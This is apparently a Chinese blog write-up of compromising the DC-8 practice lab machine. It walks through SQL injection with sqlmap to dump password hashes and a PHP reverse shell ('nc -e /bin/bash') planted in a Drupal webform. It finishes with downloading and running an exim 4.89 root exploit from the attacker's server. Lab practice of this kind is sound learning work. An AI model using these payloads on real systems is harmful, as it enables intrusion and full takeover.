---
title: DC-8
author: Pp1ove
avatar: \img\custom\head.jpg
authorLink: 
authorAbout: Pplover
authorDesc: 一个好奇的人
categories: 靶机
comments: false
date: 2021-02-18 18:24:42
tags: 渗透
keywords:
description:
photos: \img\article\24.png
---

# 信息搜集

## 主机发现

```
nmap -sn 192.168.182.0/24
nmap -sS 192.168.182.149
```

![image-20210218182641287](DC-8/image-20210218182641287.png)

访问80端口

![image-20210218182840209](DC-8/image-20210218182840209.png)

# 数据库攻击

点击Who We Are 

发现url出现nid=2，加个单引号试试，发现sql注入

![image-20210218183034789](DC-8/image-20210218183034789.png)

用sqlmap跑，当然这里就是一个union的整形注入,手工注入也可以

```bash
sqlmap -u http://192.168.182.149/?nid=1  -D d7db -T users -C "name,pass" --dump #爆数据
```

![image-20210218183924425](DC-8/image-20210218183924425.png)

+-------+---------------------------------------------------------+
| name  | pass                                                    |
+-------+---------------------------------------------------------+
| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |
| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |
+-------+---------------------------------------------------------+

## 破解密码

有个john用户,估计是要让我们破解john的密码

![image-20210218192802338](DC-8/image-20210218192802338.png)

成功登录

![image-20210218192847670](DC-8/image-20210218192847670.png)

# Getshell

到处乱找找到了可以添加代码的地方

在Add content–>Webform去添加webshell

![image-20210218193640808](DC-8/image-20210218193640808.png)

但是找不到路劲,无法执行php代码

改为反弹shell

```php
<?php
system("nc -e /bin/bash 192.168.182.137 2333");
 ?>
```

然后发现代码需要提交表单才能执行,只有又去修改Contact Us里的WEBFORM

![image-20210218194929461](DC-8/image-20210218194929461.png)

然后提交表单

![image-20210218194828077](DC-8/image-20210218194828077.png)

但是一直成功不了,我也不知道为什么,加了个<p></p>标签后退出登录提交表单又成功了

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

进入交互模式

# 提权

去home目录下看了发现没有东西

然后 sudo -l 不行

查看具有root权限的命令

```
find / -perm -u=s -type f 2>/dev/null
```

![image-20210218200235198](DC-8/image-20210218200235198.png)

发现exim4,--version查看版本为4.89

本地找一下发现有一个可以提权的漏洞

![image-20210218200622059](DC-8/image-20210218200622059.png)

本地开启8000端口

```
python -m SimpleHTTPServer 8000
```

使用wget下载，发现只有在tmp目录下有权限

```
www-data@dc-8:/tmp$ wget http://192.168.182.137:8000/46996.sh 
```

使用中报错了，需要对exp脚本进行编码

```
vim 46996.sh       #应该是回kali中进行编码,然后重新下载,我在获取的shell中修改还是报错

:set ff=unix

:wq
```

然后加权限

```
chmod +777 46996.sh
```

按照脚本中所说的 加 -m netcat 成功获取root权限

![image-20210218204253041](DC-8/image-20210218204253041.png)